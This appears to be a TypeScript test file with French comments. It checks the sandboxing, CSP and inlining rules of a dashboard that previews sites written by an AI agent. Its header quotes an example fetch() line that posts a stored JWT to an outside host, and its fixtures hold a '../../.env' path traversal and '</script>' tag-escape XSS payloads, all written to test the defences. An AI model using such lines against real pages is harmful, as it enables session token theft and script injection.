// L'Aperçu — et le seul mur qui compte vraiment.
//
// ─── CE QU'ON EXÉCUTE ICI ────────────────────────────────────────────────────
//
// Prévisualiser un site que l'agent vient d'écrire, c'est exécuter dans le
// navigateur de l'hôte du HTML et du JavaScript qu'il n'a pas relus. Servi en
// même origine que le tableau de bord, trois lignes suffisent :
//
//     fetch('https://ailleurs/', {method:'POST', body: localStorage['hive.jwt']})
//
// …et celui qui reçoit devient administrateur de la ruche. Le contenu vient
// d'un modèle qui a lu le dépôt, et le dépôt peut être public : ce n'est pas une
// hypothèse tordue.
//
// LE TEST QUI FAIT TOUT TENIR est celui de `SANDBOX_APERCU` : il vérifie que
// `allow-same-origin` n'y est pas. C'est le seul attribut dont la présence
// transformerait cet aperçu en prise de compte, et il s'ajoute d'une main
// distraite quand une image ne se charge pas.

import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import { CSP_APERCU, MAX_APERCU, SANDBOX_APERCU, assemblerApercu } from '../src/shared/apercu.js';

const f = (o: Record<string, string>) => new Map(Object.entries(o));

describe('LE MUR — l’origine opaque', () => {
  it('`allow-same-origin` N’EST PAS DANS LE SANDBOX, ET NE DOIT JAMAIS Y ÊTRE', () => {
    // Sans `allow-same-origin`, le cadre a une origine unique et inaccessible :
    // il ne lit ni le localStorage du tableau de bord, ni ses cookies. L'ajouter
    // rendrait au code prévisualisé l'origine de la ruche — donc le jeton.
    expect(SANDBOX_APERCU).not.toContain('allow-same-origin');
  });

  it('AUCUNE NAVIGATION, AUCUN FORMULAIRE, AUCUNE FENÊTRE', () => {
    // Un aperçu qui peut remplacer la page par une fausse mire de connexion est
    // un hameçonnage servi depuis le domaine de confiance de l'utilisateur.
    for (const interdit of [
      'allow-top-navigation',
      'allow-popups',
      'allow-forms',
      'allow-modals',
      'allow-pointer-lock',
      'allow-downloads',
    ]) {
      expect(SANDBOX_APERCU, interdit).not.toContain(interdit);
    }
  });

  it('les scripts, eux, sont permis — sinon ce n’est plus un aperçu', () => {
    expect(SANDBOX_APERCU).toContain('allow-scripts');
  });
});

describe('la politique coupe la sortie', () => {
  it('TOUT EST REFUSÉ PAR DÉFAUT', () => {
    expect(CSP_APERCU.startsWith("default-src 'none'")).toBe(true);
  });

  it('LE RÉSEAU EST COUPÉ — connect-src et form-action', () => {
    // Même si le cadre n'a rien de secret à voler, il ne doit pas pouvoir
    // appeler dehors : ce serait une balise de traçage dans le navigateur de
    // l'hôte, et un canal pour recevoir des instructions.
    expect(CSP_APERCU).toContain("connect-src 'none'");
    expect(CSP_APERCU).toContain("form-action 'none'");
    expect(CSP_APERCU).toContain("base-uri 'none'");
  });

  it('aucune source EXTERNE n’est autorisée', () => {
    // Ni `https:`, ni `*`, ni un domaine nommé : tout ce qui s'affiche vient du
    // document lui-même.
    expect(CSP_APERCU).not.toMatch(/https?:/);
    expect(CSP_APERCU).not.toContain('*');
  });
});

describe('le document auto-suffisant', () => {
  it('inline une feuille de style', () => {
    const r = assemblerApercu(
      f({
        'index.html':
          '<html><head><link rel="stylesheet" href="style.css"></head><body>a</body></html>',
        'style.css': 'body { color: gold; }',
      }),
    );
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.html).toContain('<style>');
    expect(r.html).toContain('color: gold');
    expect(r.html).not.toContain('<link');
    expect(r.inlines).toEqual(['style.css']);
  });

  it('inline un script', () => {
    const r = assemblerApercu(
      f({
        'index.html': '<html><head></head><body><script src="app.js"></script></body></html>',
        'app.js': 'console.log("miel");',
      }),
    );
    if (!r.ok) return;
    expect(r.html).toContain('console.log("miel")');
    expect(r.html).not.toContain('src="app.js"');
  });

  it('résout les chemins relatifs depuis le dossier de la page', () => {
    const r = assemblerApercu(
      f({
        'site/index.html': '<head><link rel="stylesheet" href="css/a.css"></head>',
        'site/css/a.css': '.a{}',
      }),
    );
    if (!r.ok) return;
    expect(r.inlines).toEqual(['site/css/a.css']);
  });

  it('LA POLITIQUE EST EN PREMIER DANS LE HEAD', () => {
    // Placée après un script, elle ne s'appliquerait pas à lui — et c'est
    // précisément à lui qu'on veut qu'elle s'applique.
    const r = assemblerApercu(
      f({ 'index.html': '<html><head><script>evil()</script></head><body></body></html>' }),
    );
    if (!r.ok) return;
    expect(r.html.indexOf('Content-Security-Policy')).toBeLessThan(r.html.indexOf('evil()'));
  });

  it('un document sans `head` reçoit la politique quand même', () => {
    const r = assemblerApercu(f({ 'index.html': '<p>bonjour</p>' }));
    if (!r.ok) return;
    expect(r.html).toContain('Content-Security-Policy');
    expect(r.html.indexOf('Content-Security-Policy')).toBeLessThan(r.html.indexOf('bonjour'));
  });
});

describe('ce qu’on refuse d’inliner', () => {
  it('UNE FEUILLE HORS DU PROJET N’EST PAS INLINÉE', () => {
    // `../../.env` ne devient pas une feuille de style parce qu'il est écrit
    // dans un attribut `href`. C'est la même règle que le Rayon, réutilisée.
    const r = assemblerApercu(
      f({
        'index.html': '<head><link rel="stylesheet" href="../../.env"></head>',
        '.env': 'SECRET=nectar',
      }),
    );
    if (!r.ok) return;
    expect(r.html).not.toContain('SECRET=nectar');
    expect(r.inlines).toEqual([]);
  });

  it('une URL externe reste telle quelle — la politique la bloquera', () => {
    // La retirer en silence donnerait un aperçu qui ment sur ce que la page
    // demande. La laisser visible et bloquée est plus honnête.
    const r = assemblerApercu(
      f({ 'index.html': '<head><link rel="stylesheet" href="https://cdn.exemple/x.css"></head>' }),
    );
    if (!r.ok) return;
    expect(r.html).toContain('https://cdn.exemple/x.css');
    expect(r.inlines).toEqual([]);
  });

  it('UN FICHIER QUI TENTE DE FERMER SA BALISE NE SORT PAS DU BLOC', () => {
    // Un JS contenant `</script>` refermerait la balise, et la suite serait
    // interprétée comme du HTML — l'échappatoire classique de l'inlining.
    const r = assemblerApercu(
      f({
        'index.html': '<body><script src="a.js"></script></body>',
        'a.js': 'var x = "</script><img src=x onerror=vole()>";',
      }),
    );
    if (!r.ok) return;
    // Une seule vraie fermeture : celle qu'on a écrite.
    expect(r.html.match(/<\/script>/gi)?.length).toBe(1);
    expect(r.html).toContain('<\\/script>');
  });

  it('un CSS qui tente la même chose non plus', () => {
    const r = assemblerApercu(
      f({
        'index.html': '<head><link rel="stylesheet" href="a.css"></head>',
        'a.css': 'body{}</style><script>vole()</script>',
      }),
    );
    if (!r.ok) return;
    expect(r.html.match(/<\/style>/gi)?.length).toBe(1);
  });

  it('un fichier absent laisse la balise, sans planter', () => {
    const r = assemblerApercu(
      f({ 'index.html': '<head><link rel="stylesheet" href="absent.css"></head>' }),
    );
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.html).toContain('absent.css');
  });
});

describe('les refus', () => {
  it('AUCUNE PAGE À MONTRER SE DIT, ET DIT OÙ LA METTRE', () => {
    const r = assemblerApercu(f({ 'src/index.ts': 'export const a = 1;' }));
    expect(r.ok).toBe(false);
    if (!r.ok) {
      expect(r.refus).toBe('pas_de_page');
      expect(r.motif).toMatch(/index\.html/);
    }
  });

  it('les points d’entrée usuels sont trouvés', () => {
    for (const e of ['index.html', 'public/index.html', 'dist/index.html', 'site/index.html']) {
      const r = assemblerApercu(f({ [e]: '<p>ok</p>' }));
      expect(r.ok, e).toBe(true);
      if (r.ok) expect(r.entree).toBe(e);
    }
  });

  it('une page démesurée est refusée plutôt que de figer l’onglet', () => {
    const r = assemblerApercu(f({ 'index.html': `<p>${'x'.repeat(MAX_APERCU)}</p>` }));
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.refus).toBe('trop_gros');
  });
});

describe('LE CADRE, CÔTÉ ÉCRAN — ce qu’aucun test unitaire ne verrouille', () => {
  const BRUT = readFileSync(
    fileURLToPath(new URL('../dashboard/src/views/Rayon.tsx', import.meta.url)),
    'utf8',
  );
  /**
   * Le CODE, sans les commentaires.
   *
   * L'en-tête du cadre EXPLIQUE pourquoi `allow-same-origin` est proscrit — et
   * une garde qui lirait le fichier brut accuserait donc la phrase qui protège.
   * On dépouille, comme le fait déjà `isolement-couverture.test.ts`.
   */
  const VUE = BRUT.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*(?:\/\/|\*).*$/gm, '');

  it('l’iframe prend son sandbox DU SERVEUR, pas d’une constante locale', () => {
    // Deux copies d'une même règle de sécurité finissent toujours par diverger,
    // et c'est la copie oubliée qui décide. Le serveur renvoie la valeur avec
    // le document ; l'écran la pose telle quelle.
    expect(VUE).toContain('sandbox={apercu.sandbox}');
  });

  it('`allow-same-origin` N’APPARAÎT NULLE PART DANS LA VUE', () => {
    // C'est l'attribut qu'on ajoute d'une main distraite quand une image ne se
    // charge pas. Ce test est là pour que ce geste-là soit rouge.
    expect(VUE).not.toContain('allow-same-origin');
  });

  it('le document passe par `srcDoc`, jamais par une URL de la ruche', () => {
    // `src="/api/…/apercu"` donnerait au cadre l'origine de la ruche, et donc
    // le localStorage où vit le jeton. `srcDoc` dans un cadre sans
    // `allow-same-origin` lui donne une origine opaque.
    expect(VUE).toContain('srcDoc={apercu.html}');
    expect(VUE).not.toMatch(/<iframe[^>]*\bsrc=/);
  });
});
